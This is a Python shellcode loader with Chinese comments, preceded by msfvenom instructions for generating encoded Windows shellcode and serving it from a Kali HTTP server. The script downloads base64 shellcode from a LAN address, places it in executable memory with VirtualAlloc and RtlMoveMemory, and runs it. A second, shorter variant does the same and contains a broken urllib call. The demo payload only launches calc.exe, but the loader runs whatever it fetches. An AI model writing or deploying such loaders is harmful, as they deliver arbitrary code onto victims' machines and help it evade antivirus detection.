"""
1. 生成window系统的shellcode
msfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f raw cmd=calc.exe >shellcode.raw
2. 对shellcode 进行base64编码
base64 -w 0 -i shellcode.raw >shellcode.bin
3.在kali启动一个http服务
Python -m SimpleHttpServer 8888

"""
from urllib import request
import base64
import ctypes

kernel32 = ctypes.windll.kernel32


def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
        return shellcode


def write_memory(buf):
    length = len(buf)
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)

    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    # 申请内存空间
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buffer)

    shell_func = ctypes.cast(ptr,ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == "__main__":
    url = "http://192.168.66.151:8888/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)



import urllib
import ctypes
import base64

# 下载shellcode
url ="http://192.168.66.151:8888/shellcode.bin"
response = urllib.request(url)
# 解码
shellcode = base64.b64decode(response.read())
# 申请内存空间
shellcode_buffer = ctypes.create_string_buffer(shellcode,len(shellcode))
# 创建shellcode的函数指针
shellcode_func = ctypes.cast(shellcode_buffer,ctypes.CFUNCTYPE(ctypes.c_void_p))
# 执行shellcode
shellcode_func()